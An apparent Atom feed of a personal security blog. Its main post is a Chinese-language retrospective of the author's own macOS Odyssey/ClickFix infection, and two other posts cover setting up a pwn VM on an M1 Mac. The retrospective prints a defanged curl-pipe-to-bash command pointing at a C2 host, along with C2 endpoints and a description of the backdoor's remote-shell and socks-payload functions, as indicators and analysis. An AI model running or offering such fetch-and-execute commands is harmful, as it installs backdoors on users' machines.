<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <author>
    <name>mu</name>
  </author>
  <generator uri="https://hexo.io/">Hexo</generator>
  <id>https://mu-sec.github.io/</id>
  <link href="https://mu-sec.github.io/" rel="alternate"/>
  <link href="https://mu-sec.github.io/atom.xml" rel="self"/>
  <rights>All rights reserved 2026, mu</rights>
  <subtitle>每天都要创造一点快乐</subtitle>
  <title>Why am I such a vegetable?</title>
  <updated>2026-06-23T12:20:47.048Z</updated>
  <entry>
    <author>
      <name>mu</name>
    </author>
    <category term="macOS" scheme="https://mu-sec.github.io/tags/macOS/"/>
    <category term="安全" scheme="https://mu-sec.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    <category term="Malware" scheme="https://mu-sec.github.io/tags/Malware/"/>
    <content>
      <![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>好久没更新博客，一更新就是自己中招。</p><p>事情的起因是我让 Codex 帮我做了一次非侵入式安全检查，本来只是想看看 Mac 上有没有什么奇怪的后台、启动项、网络连接。结果在 <code>/Library/LaunchDaemons/</code> 里翻出来一个非常不对劲的东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Library/LaunchDaemons/com.14622.plist</span><br></pre></td></tr></table></figure><p>名字就很不 Apple，也不像正常厂商的 bundle id。打开一看，是一段被塞进 plist 里的混淆 AppleScript，通过 <code>osascript</code> 跑起来，后面还连着 C2、远程命令、下载 socks payload 这一整套。</p><p>阴沟里翻船了属于是。平时看别人 ClickFix 中招，轮到自己也就一行复制粘贴的事。</p><p>本文是这次事件的复盘。样本和命令都会做去武器化处理，不放能直接复制执行的 payload。</p><h2 id="结论先行"><a href="#结论先行" class="headerlink" title="结论先行"></a>结论先行</h2><p>这次不是浏览器 0day，也不是 macOS 被远程打穿。最可信的入口是我自己在终端里执行了一条被 base64 包装过的命令。</p><p>zsh 历史里有完整记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2025-10-20 10:25:04 CST</span><br><span class="line">echo &quot;&lt;base64 payload&gt;&quot; | base64 -d | bash</span><br></pre></td></tr></table></figure><p>解码后实际执行的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s hxxp://185[.]93[.]89[.]62/d/xxx33312 | nohup bash &amp;</span><br></pre></td></tr></table></figure><p>这个时间点和后续文件落地完全对齐：</p><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>2025-10-20 10:25:04</td><td>终端执行 base64 包装命令</td></tr><tr><td>2025-10-20 10:25:08</td><td>创建 <code>~/.chost</code>、<code>~/.username</code></td></tr><tr><td>2025-10-20 10:25:14</td><td>创建 <code>~/.pwd</code></td></tr><tr><td>2025-10-20 10:25:37</td><td>写入 <code>/Library/LaunchDaemons/com.14622.plist</code></td></tr><tr><td>2025-10-20 10:25:38</td><td>创建 <code>~/.botid</code>，说明已向 C2 注册成功</td></tr><tr><td>2025-10-20 10:26:39</td><td>删除 <code>nohup.out</code></td></tr><tr><td>2025-10-23 21:55:04</td><td>创建 <code>~/.uninstalled</code>，后门开始自停</td></tr></tbody></table><p>也就是说，感染点基本可以锚定在 <code>2025-10-20 10:25:04</code> 这一条终端命令。</p><h2 id="样本行为"><a href="#样本行为" class="headerlink" title="样本行为"></a>样本行为</h2><p><code>com.14622.plist</code> 是一个 root-owned LaunchDaemon，但是指定以我的用户运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Label: com.14622</span><br><span class="line">Program: /bin/bash</span><br><span class="line">UserName: liyilin</span><br><span class="line">RunAtLoad: true</span><br><span class="line">KeepAlive: true</span><br></pre></td></tr></table></figure><p>它真正执行的是一段混淆 AppleScript。逻辑拆开以后大概是：</p><ol><li>读取 <code>~/.chost</code>，里面是 C2 地址：<code>185[.]93[.]89[.]62</code></li><li>读取 <code>~/.username</code>，本机里是 <code>xxx</code></li><li>如果 <code>~/.botid</code> 不存在，就向 C2 注册：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hxxp://185[.]93[.]89[.]62/api/v1/bot/joinsystem/&lt;username&gt;/&lt;macOS version&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>注册成功后写入 <code>~/.botid</code></li><li>进入循环，每 60 秒请求动作：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hxxp://185[.]93[.]89[.]62/api/v1/bot/actions/&lt;botid&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li>远端动作支持三类：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">repeat       拉远端脚本并交给 bash</span><br><span class="line">doshell      执行任意 shell 命令</span><br><span class="line">enablesocks5 下载 /tmp/socks 并后台运行</span><br></pre></td></tr></table></figure><ol start="7"><li>如果远端返回 <code>uninstall</code>，或者多次请求失败，就写 <code>~/.uninstalled</code>，以后启动时直接退出。</li></ol><p>比较关键的是，当前机器上没有发现 <code>~/.lastaction</code>，也没有发现 <code>/tmp/socks</code> 残留。结合本地证据，我能确定它注册过机器，但没有足够证据证明它后续执行过远程命令或被拿去做代理。</p><p>当然，这只是“本机残留能证明的范围”。如果远端下发的命令自己清理痕迹，本机就不一定能完整还原。</p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><p>本机发现的 IOC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/Library/LaunchDaemons/com.14622.plist</span><br><span class="line">~/.chost</span><br><span class="line">~/.username</span><br><span class="line">~/.botid</span><br><span class="line">~/.pwd</span><br><span class="line">~/.uninstalled</span><br></pre></td></tr></table></figure><p>网络 IOC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">185[.]93[.]89[.]62</span><br><span class="line">hxxp://185[.]93[.]89[.]62/d/xxx33312</span><br><span class="line">hxxp://185[.]93[.]89[.]62/otherassets/plist</span><br><span class="line">hxxp://185[.]93[.]89[.]62/otherassets/socks</span><br></pre></td></tr></table></figure><p>公开情报里也能对上。URLhaus 上这个 host 从 2025 年 8 月开始就有 OdysseyStealer&#x2F;ClickFix 相关记录，而且当前显示在线恶意 URL 为 0%。ThreatFox 也把相关 ASN 标到了恶意基础设施上下文里。</p><p>参考：</p><ul><li><a href="https://urlhaus.abuse.ch/host/185.93.89.62/">https://urlhaus.abuse.ch/host/185.93.89.62/</a></li><li><a href="https://threatfox.abuse.ch/asn/213790/">https://threatfox.abuse.ch/asn/213790/</a></li><li><a href="https://cyberpress.org/odyssey-macos-stealer/">https://cyberpress.org/odyssey-macos-stealer/</a></li></ul><h2 id="我当时大概干了什么"><a href="#我当时大概干了什么" class="headerlink" title="我当时大概干了什么"></a>我当时大概干了什么</h2><p>本机 Chrome History 和 Quarantine 事件没有留下能直接指向具体网页的 URL，所以不能 100% 还原“哪个页面”。</p><p>但 zsh 历史能还原大概场景：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10:25:04  执行 base64 -d | bash</span><br><span class="line">10:26:30  ls</span><br><span class="line">10:26:33  cd</span><br><span class="line">10:26:39  rm -rf nohup.out</span><br><span class="line">10:35:25  cd Downloads</span><br><span class="line">10:35:31  进入一个 MuMu 相关目录</span><br><span class="line">10:40:25  从 /Volumes/MuMuPlayer Pro 1.6.10 Crked | Digit77.com/ 下执行东西</span><br><span class="line">10:43:57  xattr -cr &quot;/Applications/MuMuPlayer Pro.app&quot;</span><br></pre></td></tr></table></figure><p>这里有两个点：</p><p>第一，<code>nohup.out</code> 几乎可以确定是那条恶意命令跑出来的，因为 payload 本身就是 <code>nohup bash &amp;</code>。我一分钟后手动删了它，说明当时我人在终端前面，可能看到多了一个输出文件，但没意识到刚才那条命令已经落地持久化。</p><p>第二，后面出现了 <code>MuMuPlayer Pro 1.6.10 Crked | Digit77.com</code> 这种明显高危上下文，还执行了 <code>xattr -cr</code>。这不一定就是感染源，因为恶意命令发生在它之前十分钟；但它说明当时大概率是在下载&#x2F;安装某个破解器、破解版软件或者绕过 Gatekeeper 的东西。这个操作环境非常适合 ClickFix 页面投递：网页告诉你“复制命令到终端验证&#x2F;安装&#x2F;修复”，你一贴就结束了。</p><p>所以我的还原是：</p><blockquote><p>我当时大概率遇到了一个假验证&#x2F;假安装页面。页面给了一段 base64 包装的终端命令，我把它复制到 Terminal 里执行。命令拉取并运行了 <code>185[.]93[.]89[.]62/d/xxx33312</code>，随后 payload 写入 LaunchDaemon 完成持久化。</p></blockquote><p>这就是 ClickFix 的可怕之处：它不需要漏洞，它利用的是“用户愿意帮它过最后一道执行门槛”。</p><h2 id="为什么能写进-LaunchDaemon"><a href="#为什么能写进-LaunchDaemon" class="headerlink" title="为什么能写进 LaunchDaemon"></a>为什么能写进 LaunchDaemon</h2><p><code>/Library/LaunchDaemons/</code> 不是普通用户能随便写的地方。这里能写进去，说明当时至少发生过一种情况：</p><ol><li>payload 弹了伪系统密码框，骗到了管理员密码；</li><li>payload 调用了需要管理员授权的脚本，我输入过密码；</li><li>当时终端里存在某种 sudo 授权窗口；</li><li>其他我现在无法从残留里证明的提权方式。</li></ol><p>这次样本里还留了 <code>~/.pwd</code>，创建时间是 <code>10:25:14</code>，在恶意命令执行后 10 秒出现。<code>com.14622.plist</code> 本身没有引用它，所以不能直接说它就是管理员密码，但它和整套文件同一时间生成，我会按敏感信息泄漏来处理。</p><h2 id="清理过程"><a href="#清理过程" class="headerlink" title="清理过程"></a>清理过程</h2><p>清理前先做了样本保全：</p><ul><li>原始 plist</li><li>隐藏配置文件</li><li>文件时间戳</li><li>SHA256</li><li>launchd 状态</li><li>进程和网络快照</li></ul><p>然后再清理持久化：</p><ol><li>卸载 <code>system/com.14622</code></li><li>删除 <code>/Library/LaunchDaemons/com.14622.plist</code></li><li>删除用户目录下的 <code>.chost</code>、<code>.username</code>、<code>.botid</code>、<code>.lastaction</code>、<code>.uninstalled</code>、<code>.pwd</code></li><li>检查 <code>/tmp/socks</code>、<code>/private/tmp/socks</code>、<code>/var/tmp/socks</code></li><li>复查进程、launchd、网络连接和常见持久化目录</li><li>触发 macOS 安全数据更新</li></ol><p>最终复查结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">launchd 找不到 com.14622</span><br><span class="line">/Library/LaunchDaemons/com.14622.plist 不存在</span><br><span class="line">用户目录相关隐藏文件不存在</span><br><span class="line">/tmp/socks 不存在</span><br><span class="line">没有相关进程</span><br><span class="line">没有到 185[.]93[.]89[.]62 的连接</span><br></pre></td></tr></table></figure><p>C2 当前也直连不可达：80 端口超时，HTTP 根路径超时，ICMP 无响应。结合 URLhaus 的 offline 记录，这个投递点大概率已经下线或被封。</p><h2 id="泄漏评估"><a href="#泄漏评估" class="headerlink" title="泄漏评估"></a>泄漏评估</h2><p>能确定的是：</p><ul><li>我的机器至少成功向 C2 注册过；</li><li>远端拿到了用户名标识、macOS 版本、来源 IP、bot id；</li><li>本机曾经具备执行远程动作的后门能力。</li></ul><p>不能确定的是：</p><ul><li>是否真的执行过 <code>doshell</code>；</li><li>是否上传过文件；</li><li>是否读取过 Keychain、浏览器 Cookie、钱包扩展数据；</li><li>是否跑过额外 payload 后自清理。</li></ul><p>因为没有 <code>~/.lastaction</code>，没有 <code>/tmp/socks</code>，也没有保留 <code>out.zip</code> 之类的明显归档残留，所以本机证据不足以证明后续利用。但安全处置上不能按“没事”处理，尤其是浏览器会话、开发密钥、钱包扩展、SSH key、API token 这些。</p><h2 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h2><p>这次最有意思、也最丢人的地方是：它没有用什么高级漏洞。</p><p>它只是让我自己执行了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;base64&gt;&quot; | base64 -d | bash</span><br></pre></td></tr></table></figure><p>我做安全研究，也知道 <code>curl | bash</code> 是高危操作；但在“装软件”“过验证”“临时搞一下”的上下文里，人会很容易把这条边界放低。</p><p>以后给自己立几条规矩：</p><ol><li>网页让复制命令到终端，一律先当成恶意。</li><li>任何 <code>base64 -d | bash</code>、<code>curl | bash</code>，先解码保存到文件再看。</li><li>破解版、破解脚本、<code>xattr -cr</code> 这类上下文默认红色预警。</li><li>定期扫一遍 <code>/Library/LaunchDaemons/</code>、<code>~/Library/LaunchAgents/</code>。</li><li><code>launchctl print</code>、<code>lsof</code>、<code>ps auxww</code> 比“感觉没事”靠谱。</li><li>个人电脑也要按工作机标准对待，尤其是存了研究材料和各种 token 的机器。</li></ol><p>阴沟里翻船不可怕，可怕的是翻完还不知道自己怎么翻的。</p><p>这次至少把链路补上了：ClickFix 页面诱导复制命令，终端执行 payload，LaunchDaemon 持久化，C2 注册，几天后自停，半年后被翻出来。</p><p>记录一下，也算给长草的博客除个草。</p>]]>
    </content>
    <id>https://mu-sec.github.io/2026/06/23/%E9%98%B4%E6%B2%9F%E9%87%8C%E7%BF%BB%E8%88%B9-%E4%B8%80%E6%AC%A1macOS-Odyssey-ClickFix%E6%84%9F%E6%9F%93%E5%A4%8D%E7%9B%98/</id>
    <link href="https://mu-sec.github.io/2026/06/23/%E9%98%B4%E6%B2%9F%E9%87%8C%E7%BF%BB%E8%88%B9-%E4%B8%80%E6%AC%A1macOS-Odyssey-ClickFix%E6%84%9F%E6%9F%93%E5%A4%8D%E7%9B%98/"/>
    <published>2026-06-23T12:19:11.000Z</published>
    <summary>
      <![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>好久没更新博客，一更新就是自己中招。</p>
<p>事情的起因是我让 Codex 帮我做了一次非侵入式安全检查，本来只是想看看 Mac 上有]]>
    </summary>
    <title>阴沟里翻船：一次 macOS Odyssey/ClickFix 感染复盘</title>
    <updated>2026-06-23T12:20:47.048Z</updated>
  </entry>
  <entry>
    <author>
      <name>mu</name>
    </author>
    <category term="pwn" scheme="https://mu-sec.github.io/tags/pwn/"/>
    <content>
      <![CDATA[<h2 id="坑点一"><a href="#坑点一" class="headerlink" title="坑点一"></a>坑点一</h2><p>正常使用时发现，开机自动装载后，将一些题目文件直接在宿主机中放到共享文件夹时，在虚拟机中并不能实时更新，有以下两种解决方法：<br>1.在虚拟机中使用mkdir新建目录，随后将需要共享的文件放进新目录，这样强制进行更新，但是比较麻烦。<br>2.重新挂载，为了更简单的解决这一步，我写了一个shell脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#refresh the share dir</span><br><span class="line">sudo umount /home/mu/mac-share</span><br><span class="line">sudo mount -t davfs http://localhost:9843 /home/mu/mac-share &amp;&amp; echo &quot;刷新mac-share成功&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将它移到bin下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#sudo cp refresh /usr/bin/refresh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样每次直接在终端输入refresh，就可以刷新共享目录，完成实时同步。</p>]]>
    </content>
    <id>https://mu-sec.github.io/2022/11/18/%E5%85%B3%E4%BA%8EMac%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%96%87%E7%AB%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91%E7%82%B9%E8%AE%B0%E5%BD%95/</id>
    <link href="https://mu-sec.github.io/2022/11/18/%E5%85%B3%E4%BA%8EMac%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%96%87%E7%AB%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91%E7%82%B9%E8%AE%B0%E5%BD%95/"/>
    <published>2022-11-18T11:07:02.000Z</published>
    <summary>
      <![CDATA[<h2 id="坑点一"><a href="#坑点一" class="headerlink" title="坑点一"></a>坑点一</h2><p>正常使用时发现，开机自动装载后，将一些题目文件直接在宿主机中放到共享文件夹时，在虚拟机中并不能实时更新，有以下两种解决方法：<br>]]>
    </summary>
    <title>关于Mac环境搭建文章的一些坑点记录</title>
    <updated>2022-11-18T11:16:48.894Z</updated>
  </entry>
  <entry>
    <author>
      <name>mu</name>
    </author>
    <category term="pwn" scheme="https://mu-sec.github.io/tags/pwn/"/>
    <content>
      <![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>　　由于最近又需要重新复习pwn，但是之前的老电脑跑起来像一台拖拉机一样所以考虑尝试在Mac上搭建一套可以<strong>完美（并不）使用</strong>的pwn环境，思路依然是虚拟机+目录共享。<br>　　众所周知由于M1换了架构，所以x86的程序在本地根本跑不起来，参考之前大佬的的方法搭建了python2和python3两个docker环境，可以跑exp打远程，本地无法调试，显然不符合需求，优点是性能强，共享目录方便，确实是适合救急用，所以平时我会专门开一个桌面用于这两个docker pwn环境，细节可以参考大佬博客。<br>　　<code>https://blog.csdn.net/qq_25755011/article/details/115541221</code><br>　　短暂使用过后发现还是搭一个完美（并不）的环境靠谱，于是开始了折腾之路。</p><p><em><strong>注意：本方法对虚拟机性能会造成较大损失，请根据个人需求判断是否可以接受</strong></em></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>　　首先放一下我的配置，M1 pro 32g内存，已更macOS 13。</p><div align=center><p><img src="/%E9%85%8D%E7%BD%AE.jpg"></p></div><p>　　虚拟机选用UTM，ubuntu选用ubuntu20.04.1 LTS</p><div align=center><p><img src="/utm.jpg"></p></div><div align=center><p><img src="/ubuntu.jpg"></p></div><h2 id="安装虚拟机"><a href="#安装虚拟机" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h2><p>　　想要搞到完美的x86模拟环境肯定需要一台可以模拟x86指令集的虚拟机，由于pd和vm暂时都没有对软件模拟x86进行支持，所以这里我们选择安装UTM进行软件模拟虚拟机。这里直接在github下载安装即可，同时需要准备好ubuntu镜像。<br><code>https://github.com/utmapp/UTM/releases/latest/download/UTM.dmg　　#UTM虚拟机</code><br><code>https://releases.ubuntu.com/focal/ubuntu-20.04.5-desktop-amd64.iso　　#Ubuntu 20.04x86-64</code><br>　　安装完成之后，打开UTM，新建虚拟机，选择模拟（我这里已经安装完一个虚拟机，可能界面不同）  </p><div align=center><p><img src="/UTM1.jpg"></p></div>  <p>　　这里选择linux，继续往下走。</p><div align=center><p><img src="/UTM2.jpg"></p></div> <p>　　这里选择启动光盘镜像，随后选择你下载的ubuntu的镜像文件，下一步。</p><div align=center><p><img src="/UTM3.jpg"></p></div> <p>　　在这里的设置其实对虚拟机跑起来的性能影响不大，模拟出的cpu默认也不支持多核，所以默认即可，也可以把内存设置大一点、设置个4核图一个心理安慰，下一步。</p><div align=center><p><img src="/UTM4.jpg"></p></div> <p>　　这里影响也不大，我们后期会使用本地目录共享挂载到虚拟机使用，这里的驱动器大小设置64、128看个人情况，下一步。</p><div align=center><p><img src="/UTM5.jpg"></p></div><p>　　在你的本机创建一个目录，然后在这里选择他，这个目录就是以后宿主机与虚拟机的文件共享的目录，具体后面会详细说明，暂时先设置，但是不会生效。</p><div align=center><p><img src="/UTM6.jpg"></p></div> <p>　　这里起一个自己喜欢的名字即可，保存后启动虚拟机，开始正常的ubuntu安装过程。</p><div align=center><p><img src="/UTM7.jpg"></p></div> <p>安装完毕后，<strong>取消</strong>CD&#x2F;DVD的装载后，设置网络为<strong>桥接</strong>后进入系统。</p><p>　　<strong>提示：这里安装ubuntu的过程和vm安装的过程完全一样，就是非常非常非常慢，耐心等待安装即可，后面会对其进行优化</strong></p><h2 id="SSH连接"><a href="#SSH连接" class="headerlink" title="SSH连接"></a>SSH连接</h2><p>　　UTM自带的UI界面简直不能再卡，本身模拟就很卡，基本无法操作，所以暂时先忍受卡顿安装SSH服务，用本机的远程连接操作shell会好很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># sudo apt update</span><br><span class="line"># sudo apt install openssh-server</span><br></pre></td></tr></table></figure><p>出现提示一路回车，安装完毕后可以使用以下指令查看服务状态，该服务默认自启。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo systemctl status openssh-server</span><br></pre></td></tr></table></figure><p>然后查看虚拟机ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ifconfig </span><br><span class="line"># 如果报错，执行</span><br><span class="line"># sudo apt-get install net-tools</span><br></pre></td></tr></table></figure><p>查看本机ip,第一个网卡里的ip就是我们虚拟机的ip，此时可以尝试用宿主机去ping一下，应该可以ping通。</p><div align=center><p><img src="/ip.jpg"></p></div> <p>随后我们就可以用mac的终端<strong>新建远程连接</strong>到ubuntu。</p><h2 id="配置共享文件夹"><a href="#配置共享文件夹" class="headerlink" title="配置共享文件夹"></a>配置共享文件夹</h2><p>　　这里我们采用WebDAV实现共享文件夹,安装SPICE、WebDAV。本节中建议所有操作先在root下进行，或者全程sudo。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># apt update</span><br><span class="line"># apt install spice-vdagent spice-webdavd </span><br></pre></td></tr></table></figure><p>　　配置UTM共享选项，选择SPICE WebDAV</p><div align=center><p><img src="/UTM8.jpg"></p></div> <p>此时进入系统后，可以访问网络中其他位置找到共享文件夹，该文件内容与此前设置的共享路径一致，但是此时的问题是命令行无法访问到该目录，仅可通过网络访问，地址如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># http://localhost:9843  #默认端口为9843,这个链接指向UTM设置的共享路径</span><br></pre></td></tr></table></figure><p>（由于写教程时已经卸载桌面，所以没有截图）</p><p>为了实现需求，我们安装davfs2实现挂载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># sudo apt update</span><br><span class="line"># sudo apt install davfs2</span><br></pre></td></tr></table></figure><p>安装完成后，可以直接使用以下指令挂载davfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># sudo mount -t davfs http://localhost:9843 &lt;your path&gt;</span><br><span class="line">e.g. </span><br><span class="line"># sudo mount -t davfs http://localhost:9843 /User/mu/mac-share</span><br></pre></td></tr></table></figure><p>此时便可以访问挂载点，该操作可能会要求输入用户名和密码，该步骤输入什么都可以，UTM的共享本身没有身份校验，可以一路回车，也可以输入任意值，建议输入1，1</p><div align=center><p><img src="/share1.jpg"><br><img src="/share2.jpg"></p></div> <h2 id="实现开机免密自动挂载"><a href="#实现开机免密自动挂载" class="headerlink" title="实现开机免密自动挂载"></a>实现开机免密自动挂载</h2><p>首先开启用户锁，删除use_locks前面的#并把1改为0，命令如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo vim /etc/davfs2/davfs2.conf</span><br></pre></td></tr></table></figure><div align=center><p><img src="/lock.jpg"></p></div> <p>之后，保存用户名和密码,在最下面新起一行添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># sudo vim /etc/davfs2/secrets</span><br><span class="line"># 添加 &lt;你的WebDAV地址 1 1&gt;</span><br></pre></td></tr></table></figure><p>在这里由于我们没有身份验证，所以直接使用1进行占位，添加  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># http://localhost:9843 1 1</span><br></pre></td></tr></table></figure><div align=center><p><img src="/pass.jpg"></p></div> <p>保存退出，此时可以取消挂载，并重新挂载试一下，不需要回车了，可以直接挂载成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># sudo umount &lt;your path&gt;</span><br><span class="line"># sudo mount -t davfs http://localhost:9843 &lt;your path&gt;</span><br></pre></td></tr></table></figure><p>随后开启开机自动挂载,添加配置信息到如下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># sudo vim /etc/fstab</span><br><span class="line"># 添加 http://localhost:9843 &lt;你的虚拟机内路径&gt; davfs defaults 0 0</span><br></pre></td></tr></table></figure><p>保存后即可实现开机自动挂载</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>　　由于我装的桌面版ubuntu，又不想直接用服务器版，两者差异比较难习惯，所以在此卸载桌面版臃肿的桌面系统，提高系统流畅度，具体流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>修改<br>GRUB_CMDLINE_LINUX_DEFAULT&#x3D;“quiet splash”<br>　　　　　　　　　⬇️<br>GRUB_CMDLINE_LINUX_DEFAULT&#x3D;“text”<br>执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># sudo update-grub</span><br><span class="line"># sudo systemctl set-default multi-user.target</span><br><span class="line"># sudo reboot</span><br><span class="line"># 重启后</span><br><span class="line"># sudo apt-get remove gnome-shell</span><br><span class="line"># sudo apt-get remove gnome</span><br><span class="line"># sudo apt-get autoremove</span><br><span class="line"># sudo apt-get purge gnome</span><br><span class="line"># sudo snap remove store</span><br><span class="line"># sudo snap remove gnome*</span><br><span class="line"># sudo apt remove snapd</span><br><span class="line"># sudo apt-get autoclean</span><br><span class="line"># sudo apt-get clean</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>　　自此，你就拥有了一个X86架构的pwn环境，只需要在比赛前提前打开虚拟机，宿主机远程连接使用，赛题通过共享文件夹同步，pwn环境配置不再赘述，大佬们写了很多，可以自己选择搭配自己的环境。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>　　就个人使用而言，我感觉虽然有些卡顿，但是足以满足日常使用，各位大佬有更好的方法也欢迎分享跟我，目前这是我能想到的一个笔记本实现pwn环境的最优解。</p>]]>
    </content>
    <id>https://mu-sec.github.io/2022/11/16/Mac-M1%E6%9C%AC%E5%9C%B0%E9%9D%9Edocker%E5%8F%AF%E8%B0%83%E8%AF%95PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <link href="https://mu-sec.github.io/2022/11/16/Mac-M1%E6%9C%AC%E5%9C%B0%E9%9D%9Edocker%E5%8F%AF%E8%B0%83%E8%AF%95PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <published>2022-11-16T09:16:57.000Z</published>
    <summary>
      <![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>　　由于最近又需要重新复习pwn，但是之前的老电脑跑起来像一台拖拉机一样所以考虑尝试在Mac上搭建一套可以<strong>完美（并不）使用<]]>
    </summary>
    <title>
      <![CDATA[Mac&M1本地非docker可调试PWN环境搭建]]>
    </title>
    <updated>2022-11-16T10:14:31.563Z</updated>
  </entry>
</feed>
